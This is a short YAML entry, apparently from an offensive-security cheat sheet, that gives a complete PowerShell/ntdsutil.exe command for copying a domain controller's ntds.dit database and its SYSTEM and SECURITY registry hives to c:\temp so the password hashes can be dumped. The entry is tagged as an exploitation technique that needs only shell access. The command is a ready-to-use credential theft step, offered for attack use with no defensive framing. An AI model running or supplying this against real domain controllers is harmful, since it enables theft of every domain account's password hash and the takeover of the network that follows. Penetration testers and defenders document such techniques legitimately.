---
title: |
  Dump DC hashes with ntdsutil.exe
description: |
  If you have no credentials, but you have access to the DC, it's possible to dump the ntds.dit using ntdsutil.exe. The ntds.dit and SYSTEM as well as SECURITY registry hives are dumped to c:\temp.

command: |
  powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
items:
  - No_Creds
  - Shell
services:
  - Kerberos
  - NTLM
OS:
  - Linux
  - Windows
attack_types:
  - Exploitation
references:
  - https://www.ired.team/offensive-security/credential-access-and-credential-dumping/ntds.dit-enumeration
---
